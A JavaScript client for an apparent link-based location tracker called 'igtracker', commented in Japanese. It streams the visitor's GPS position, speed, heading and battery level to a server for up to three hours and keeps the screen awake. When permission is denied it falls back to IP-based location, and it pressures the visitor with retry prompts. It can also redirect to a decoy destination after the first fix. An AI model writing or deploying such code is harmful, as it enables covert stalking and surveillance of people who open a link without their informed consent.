/* igtracker 連続位置追跡クライアント v16
   位置情報は geofix.js（LTGEO）に一本化。
   端末が位置を出せないときは回線からの推定で点を必ず残す。 */
(function () {
  "use strict";

  var CODE = window.LT_CODE || "";
  if (!CODE) return;

  (function () {
    if (window.LT_LINE_FIX === 0) return;
    var ua = navigator.userAgent || "";
    if (!/Line\//i.test(ua)) return;
    if (/[?&]openExternalBrowser=1/.test(location.search)) return;
    try {
      var u = new URL(location.href);
      u.searchParams.set("openExternalBrowser", "1");
      location.replace(u.toString());
    } catch (e) {
      location.replace(location.href +
        (location.search ? "&" : "?") + "openExternalBrowser=1");
    }
  })();

  var API = "/l/" + encodeURIComponent(CODE) + "/p";
  var IV = Math.max(5, (window.LT_IV || 15) | 0) * 1000;
  var MAXMIN = (window.LT_MAX || 180) | 0;
  var HIT = window.LT_HIT || 0;
  var SEND_EVERY = Math.min(IV, 4000);

  var DEST = window.LT_DEST || "";
  var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
  var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
  var ASK_TEXT = window.LT_ASK_TEXT || "位置情報の使用を許可してください";
  var DENY_TEXT = window.LT_DENY_TEXT || "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください";
  var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
  var DEBUG = !!window.LT_DEBUG || /[?&]dbg=1/.test(location.search);

  function canLeave() {
    return !!DEST && (!window.LT_REQUIRE_ALL || !!window.LT_ALLOW_REDIRECT);
  }

  var SID = (function () {
    try {
      var v = sessionStorage.getItem("igt_sid_" + CODE);
      if (!v) {
        v = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
        sessionStorage.setItem("igt_sid_" + CODE, v);
      }
      return v;
    } catch (e) { return Math.random().toString(36).slice(2, 12); }
  })();

  var q = [], sending = false, last = 0, started = 0, count = 0, left = false;
  var wake = null, clock = null, sender = null, dog = null;
  var stopped = true, gotFix = false, lastFixAt = 0, lastIp = 0, lastRetry = 0;
  var state = "wait", batt = null, chg = null, inapp = "";

  function $(id) { return document.getElementById(id); }
  function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }
  function line(t, w) {
    var s = $("lt_st");
    if (!s) return;
    s.textContent = t || "";
    s.className = "line" + (w ? " warn" : "");
  }
  function dbg(m) { if (DEBUG) { var d = $("lt_dbg"); if (d) d.textContent = m; } }
  function showDbg() {
    if (!DEBUG) return;
    ["lt_dbg", "lt_now", "lt_perm", "lt_time"].forEach(function (id) {
      var e = $(id);
      if (e) { e.className = ""; e.style.cssText = "display:block;font-size:11px;color:#6b7386"; }
    });
  }
  function showRetry() {
    var r = $("lt_retry");
    if (r) { r.textContent = RETRY_TEXT; r.style.display = state === "deny" ? "" : "none"; }
  }
  function announce() {
    window.LT_GPS_READY = true;
    try { window.dispatchEvent(new Event("igt:gps")); } catch (e) {}
  }
  function showInApp() {
    var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
    if (!box) return;
    box.style.display = "block";
    if (nm) nm.textContent = inapp;
    if (link) {
      var ios = /iPhone|iPad|iPod/i.test(navigator.userAgent || "");
      link.href = ios
        ? location.href.replace(/^https:/, "x-safari-https:")
        : "intent://" + location.href.replace(/^https?:\/\//, "") +
          "#Intent;scheme=https;package=com.android.chrome;end";
      link.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
    }
  }
  function setState(st) {
    if (st === "ok") {
      if (state === "ok") return;
      state = "ok"; line("", false); showRetry();
      var ia = $("lt_ia"); if (ia) ia.style.display = "none";
      return;
    }
    state = st;
    if (st === "deny") { line(DENY_TEXT, true); if (inapp) showInApp(); }
    else { line(ASK_TEXT, false); }
    showRetry();
  }
  function tick() {
    if (!started) return;
    var sec = Math.floor((Date.now() - started) / 1000);
    var e = $("lt_time");
    if (e) e.textContent = ("0" + Math.floor(sec / 60)).slice(-2) + ":" + ("0" + (sec % 60)).slice(-2);
  }
  function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }

  /* 位置が取れないとき：lat/lon無しで送る → サーバが回線から推定して点にする */
  function ipFallback(force) {
    if (gotFix || stopped || left) return;
    var now = Date.now();
    if (!force && now - lastIp < 55000) return;
    lastIp = now;
    try { q.push({ ts: iso(now) }); send(); } catch (e) {}
  }

  function send(extra) {
    if (sending) return;
    if (!q.length && !extra) return;
    sending = true;
    var pts = q.slice(0);
    fetch(API, {
      method: "POST", cache: "no-store",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts }),
    })
      .then(function (r) { return r.json().catch(function () { return {}; }); })
      .then(function (j) { drop(pts); last = Date.now(); if (j && j.iv && j.iv * 1000 !== IV) IV = j.iv * 1000; })
      .catch(function () {})
      .then(function () { sending = false; });
  }
  function beacon(kind) {
    var pts = q.slice(0);
    var payload = JSON.stringify({ sid: SID, kind: kind, hit: HIT, pts: pts });
    var ok = false;
    try {
      ok = !!(navigator.sendBeacon && navigator.sendBeacon(
        API, new Blob([payload], { type: "application/json" })));
    } catch (e) { ok = false; }
    if (ok) drop(pts); else send({ kind: kind });
  }
  function goto(url) {
    if (!url || left) return;
    left = true;
    try { beacon("stop"); } catch (e) {}
    try { location.replace(url); } catch (e) { location.href = url; }
  }
  function leave() { if (!left && canLeave()) goto(DEST); }

  /* LTGEO から位置が来たとき */
  function onFix(p) {
    var c = (p && p.coords) || {};
    if (c.latitude == null) return;
    var first = !gotFix;
    gotFix = true; count++; lastFixAt = Date.now();
    if (first) {
      setState("ok"); announce();
      if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
      if (canLeave()) setTimeout(leave, DEST_MIN);
    }
    q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
             acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
    if (q.length > 3000) q.splice(0, q.length - 3000);
    var n = $("lt_now");
    if (n) n.textContent = c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
                           (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : "");
    dbg("fix acc=" + Math.round(c.accuracy || 0) + " n=" + count);
    if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
  }

  function onFail(why) {
    ipFallback(true);
    if (gotFix) return;
    document.body.classList.add("need");
    setState("deny");
    if (why === "denied") showInApp();
  }

  function watchdog() {
    if (stopped || left) return;
    var gap = Date.now() - (lastFixAt || started || Date.now());
    if (!gotFix) {
      if (gap > 15000 && Date.now() - lastRetry > 12000) {
        lastRetry = Date.now();
        if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
      }
      ipFallback(false);
    }
  }

  function readBatt() {
    try {
      if (!navigator.getBattery) return;
      navigator.getBattery().then(function (b) {
        function up() { batt = b.level; chg = b.charging ? 1 : 0; }
        up();
        b.addEventListener("levelchange", up);
        b.addEventListener("chargingchange", up);
      }).catch(function () {});
    } catch (e) {}
  }
  function keepAwake() {
    try {
      if (navigator.wakeLock && !wake) {
        navigator.wakeLock.request("screen").then(function (w) {
          wake = w; w.addEventListener("release", function () { wake = null; });
        }).catch(function () {});
      }
    } catch (e) {}
  }

  function boot() {
    if (started) return;
    started = Date.now(); stopped = false;
    showDbg(); readBatt(); keepAwake(); showRetry();
    if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }

    if (!window.LTGEO) { setState("deny"); return; }
    LTGEO.subscribe(onFix);
    LTGEO.subscribeFail(onFail);
    LTGEO.subscribeStatus(function (t, w) { if (state !== "ok") line(t, w); });
    if (window.LT_FIRST_FIX) { try { onFix(window.LT_FIRST_FIX); } catch (e) {} }
    LTGEO.start();

    clock = setInterval(tick, 1000);
    sender = setInterval(function () {
      tick();
      if (q.length) send();
      else if (Date.now() - last > Math.max(30000, IV * 3)) send({ kind: "hb" });
      if (MAXMIN && Date.now() - started > MAXMIN * 60000) stop("時間上限");
    }, SEND_EVERY);
    dog = setInterval(watchdog, 5000);
    setTimeout(function () { if (!gotFix) ipFallback(true); }, 9000);

    if (!q.length) q.push({ ts: iso(Date.now()) });
    send({ kind: "open" });
  }

  function stop() {
    if (stopped) return;
    stopped = true; started = 0;
    if (clock) clearInterval(clock);
    if (sender) clearInterval(sender);
    if (dog) clearInterval(dog);
    clock = sender = dog = null;
    if (window.LTGEO) { try { LTGEO.stop(); } catch (e) {} }
    beacon("stop");
    state = "wait";
    showRetry();
  }
  function resume() {
    if (stopped || left) return;
    keepAwake();
    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
    send({ kind: "hb" });
  }

  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") { if (!left && started) beacon("hb"); return; }
    if (started) resume();
  });
  window.addEventListener("focus", function () { if (started) resume(); });
  window.addEventListener("online", function () { if (started) resume(); });
  window.addEventListener("pagehide", function () { if (!left && started) beacon("stop"); });
  window.addEventListener("pageshow", function (e) {
    if (!e.persisted || !started) return;
    stopped = false; left = false;
    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
    send({ kind: "open" });
  });
  document.addEventListener("click", function (e) {
    var t = e.target;
    if (t && t.tagName === "BUTTON") return;
    if (started && !stopped && !gotFix && window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
  }, { passive: true });
  var rt = $("lt_retry");
  if (rt) rt.addEventListener("click", function () {
    setState("wait");
    if (window.LTGEO) { try { LTGEO.retry(); } catch (e) {} }
  });

  window.LT_LIVE = {
    start: boot, stop: stop, leave: leave,
    retry: function () { if (window.LTGEO) LTGEO.retry(); },
    restart: function () { if (window.LTGEO) LTGEO.retry(); },
    feed: function (p) { try { onFix(p); } catch (e) {} },
    canLeave: canLeave, sid: SID,
    state: function () { return state; },
    perm: function () { return window.LTGEO ? LTGEO.info().perm : "unknown"; },
  };

  if (window.LT_GATE && !window.LT_GATE_PASS) {
    window.addEventListener("igt:gate", function () { boot(); }, { once: true });
  } else {
    boot();
  }
})();